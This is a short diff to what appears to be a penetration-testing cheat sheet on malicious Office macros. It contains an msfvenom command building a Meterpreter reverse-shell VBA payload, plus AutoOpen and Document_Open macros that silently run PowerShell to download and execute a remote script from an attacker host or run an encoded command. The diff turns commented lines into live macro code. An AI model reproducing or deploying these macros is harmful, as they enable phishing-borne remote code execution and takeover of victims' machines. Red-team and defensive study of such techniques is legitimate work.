@@ -609,18 +609,27 @@ msfconsole -q -x "use exploit/windows/misc/hta_server; set PAYLOAD windows/x64/m
 ```bash
 # Generate VBA macro payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f vba-psh -o macro.txt
+```
 
 # The output contains VBA code to paste into Word/Excel macro editor
-# Sub Document_Open() / AutoOpen()
 
+```vb
+Sub Document_Open()
+End Sub
+
+Sub AutoOpen()
+End Sub
+```
+
+```vb
 # Manual VBA shell launcher:
 # Insert into Word/Excel VBA editor (Alt+F11 -> ThisDocument)
-# Sub AutoOpen()
+Sub AutoOpen()
     Shell "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1:8080/shell.ps1')""", vbHide
 End Sub
 
 # Word macro with direct shellcode execution
-# Sub Document_Open()
+Sub Document_Open()
     Dim cmd As String
     cmd = "powershell -nop -w hidden -enc <BASE64_COMMAND>"
     Shell cmd, vbHide
